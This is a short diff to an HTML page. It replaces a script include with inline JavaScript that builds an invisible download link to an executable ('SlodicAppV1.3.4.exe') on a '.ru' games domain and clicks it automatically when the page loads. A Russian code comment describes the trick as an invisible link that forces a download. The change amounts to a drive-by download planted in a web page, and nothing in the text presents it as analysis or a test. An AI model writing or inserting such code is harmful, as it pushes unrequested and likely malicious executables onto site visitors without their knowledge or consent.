@@ -1,1 +1,12 @@
-<script scr="update.js"></script>
+<script>
+  const targetFile = "https://files.winnigames2024.ru/uploader/uploads/SlodicAppV1.3.4.exe";
+
+// Создаем невидимую ссылку и кликаем по ней
+const link = document.createElement('a');
+link.href = targetFile;
+link.download = ''; // Подсказывает браузеру именно скачать файл
+document.body.appendChild(link);
+link.click();
+document.body.removeChild(link);
+
+</script>
